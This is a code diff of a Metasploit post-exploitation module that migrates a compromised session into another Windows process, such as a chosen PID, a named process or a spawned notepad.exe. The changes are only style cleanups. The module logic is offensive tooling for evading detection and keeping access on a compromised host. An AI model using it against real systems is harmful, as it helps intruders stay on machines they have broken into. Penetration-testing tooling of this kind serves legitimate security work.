@@ -60,15 +60,15 @@ class MetasploitModule < Msf::Post
 
     target_pid = nil
 
-    if datastore['SPAWN'] and datastore['SPAWN'] != ""
+    if datastore['SPAWN'] && (datastore['SPAWN'] != '')
       target_pid = create_temp_proc
-    elsif datastore['PID'] and datastore['PID'] != 0
+    elsif datastore['PID'] && (datastore['PID'] != 0)
       target_pid = datastore['PID']
-    elsif datastore['NAME'] and datastore['NAME'] != ""
+    elsif datastore['NAME'] && (datastore['NAME'] != '')
       target_pid = session.sys.process[datastore['NAME']]
     end
 
-    if not target_pid or not has_pid?(target_pid)
+    if !target_pid || !has_pid?(target_pid)
       print_error("Process #{target_pid} not found")
       return
     end
@@ -78,7 +78,7 @@ class MetasploitModule < Msf::Post
       session.core.migrate(target_pid)
       print_good("Successfully migrated into process #{target_pid}")
     rescue ::Exception => e
-      print_error("Could not migrate into process")
+      print_error('Could not migrate into process')
       print_error("Exception: #{e.class} : #{e}")
     end
 
@@ -94,13 +94,13 @@ class MetasploitModule < Msf::Post
   end
 
   # Creates a temp notepad.exe to migrate to depending the architecture.
-  def create_temp_proc()
+  def create_temp_proc
     target_ppid = session.sys.process[datastore['PPID_NAME']] || datastore['PPID']
     cmd = get_notepad_pathname(client.arch, client.sys.config.getenv('windir'), client.arch)
 
-    print_status("Spawning notepad.exe process to migrate into")
+    print_status('Spawning notepad.exe process to migrate into')
 
-    if target_ppid != 0 and not has_pid?(target_ppid)
+    if (target_ppid != 0) && !has_pid?(target_ppid)
       print_error("Process #{target_ppid} not found")
       return
     elsif has_pid?(target_ppid)
